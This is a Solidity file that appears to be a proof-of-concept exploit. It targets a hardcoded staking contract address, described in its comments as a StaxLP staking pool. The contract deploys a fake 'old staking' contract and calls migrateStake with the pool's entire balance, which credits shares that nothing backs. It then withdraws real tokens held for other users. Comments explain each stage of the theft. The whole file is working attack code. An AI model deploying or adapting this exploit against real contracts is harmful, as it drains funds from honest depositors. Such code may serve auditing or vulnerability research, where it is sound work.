// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IStaxLPStakingLike {
    function stakingToken() external view returns (address);
    function migrateStake(address oldStaking, uint256 amount) external;
    function withdraw(uint256 amount, bool claim) external;
}

contract FakeOldStaking {
    constructor() {}

    function migrateWithdraw(address, uint256) external {}
}

contract FlawVerifier {
    address public constant TARGET = 0xd2869042E12a3506100af1D192b5b04D65137941;

    uint256 private _profitAmount;

    constructor() {}

    function executeOnOpportunity() public {
        address token = profitToken();
        uint256 balanceBefore = IERC20Like(token).balanceOf(address(this));

        uint256 amount = IERC20Like(token).balanceOf(TARGET);
        require(amount > 0, "no pool balance");

        // Exploit path stage 1:
        // deploy an attacker-controlled fake old staking contract that exposes
        // migrateWithdraw(address,uint256) but never transfers any staking tokens.
        FakeOldStaking fakeOldStaking = new FakeOldStaking();

        // Exploit path stages 2-3:
        // call migrateStake(fakeOldStaking, amount). The target blindly trusts the
        // attacker-supplied oldStaking and attacker-chosen amount, performs the
        // external call, and then credits shares with _applyStake even though no
        // stakingToken was received from the fake migration source.
        IStaxLPStakingLike(TARGET).migrateStake(address(fakeOldStaking), amount);

        // Exploit path stage 4:
        // redeem the freshly minted but unbacked shares for the real stakingToken
        // already held by the pool on behalf of honest users.
        IStaxLPStakingLike(TARGET).withdraw(amount, false);

        uint256 balanceAfter = IERC20Like(token).balanceOf(address(this));
        require(balanceAfter > balanceBefore, "no profit");
        _profitAmount = balanceAfter - balanceBefore;
    }

    function profitToken() public view returns (address) {
        return IStaxLPStakingLike(TARGET).stakingToken();
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    receive() external payable {}
}
